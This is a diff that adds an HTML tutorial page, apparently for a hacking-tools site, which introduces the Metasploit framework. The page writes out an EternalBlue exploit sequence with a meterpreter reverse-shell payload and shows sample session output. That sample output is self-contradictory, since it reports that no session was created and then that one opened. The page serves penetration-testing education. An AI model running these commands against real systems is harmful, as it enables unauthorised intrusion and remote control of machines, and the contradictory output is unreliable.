@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>HackStack | Metasploit</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      background: #000;
+      color: #00ff9c;
+      font-family: 'Share Tech Mono', monospace;
+    }
+
+    .header {
+      text-align: center;
+      padding: 20px;
+      border-bottom: 1px solid #00ff9c;
+    }
+
+    .container {
+      max-width: 1000px;
+      margin: auto;
+      padding: 30px;
+    }
+
+    h2 {
+      border-left: 4px solid #00ff9c;
+      padding-left: 10px;
+      margin-top: 40px;
+    }
+
+    .terminal {
+      background: #020202;
+      border: 1px solid #00ff9c;
+      padding: 15px;
+      margin-top: 10px;
+      box-shadow: 0 0 12px #00ff9c;
+      white-space: pre-wrap;
+    }
+
+    .exploit-bar {
+      height: 4px;
+      background: linear-gradient(90deg, transparent, #00ff9c, transparent);
+      animation: exploit 1.5s infinite;
+      margin: 20px 0;
+    }
+
+    @keyframes exploit {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+
+    .cmd {
+      color: #00ffaa;
+    }
+
+    .btn {
+      display: inline-block;
+      margin-top: 20px;
+      padding: 8px 16px;
+      border: 1px solid #00ff9c;
+      text-decoration: none;
+      color: #00ff9c;
+    }
+
+    .btn:hover {
+      background: #00ff9c;
+      color: #000;
+    }
+  </style>
+</head>
+<body>
+
+<div class="header">
+  <h1>METASPLOIT FRAMEWORK</h1>
+  <p>Exploitation & Post-Exploitation Engine</p>
+</div>
+
+<div class="container">
+
+  <h2>What is Metasploit?</h2>
+  <p>
+    Metasploit is a powerful penetration testing framework used to develop,
+    test, and execute exploits against vulnerable systems.
+    It provides payloads, encoders, listeners, and post-exploitation modules.
+  </p>
+
+  <div class="exploit-bar"></div>
+
+  <h2>Typical Exploitation Workflow</h2>
+  <div class="terminal">
+<span class="cmd">msfconsole</span>
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.5
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+exploit
+  </div>
+
+  <h2>Successful Session</h2>
+  <div class="terminal">
+[*] Exploit completed, but no session was created.
+[*] Meterpreter session 1 opened (192.168.1.10 → 192.168.1.5)
+
+meterpreter > sysinfo
+Computer        : VICTIM-PC
+OS              : Windows 10
+Architecture    : x64
+  </div>
+
+  <h2>Attack Phase Mapping</h2>
+  <div class="terminal">
+[ Exploitation ] → Launch vulnerability-specific modules  
+[ Payload Delivery ] → Reverse shells, Meterpreter  
+[ Post-Exploitation ] → Privilege escalation, persistence  
+  </div>
+
+  <a class="btn" href="tools.html">← Back to Tools</a>
+  <a class="btn" href="index.html">Home</a>
+
+</div>
+
+</body>
+</html>
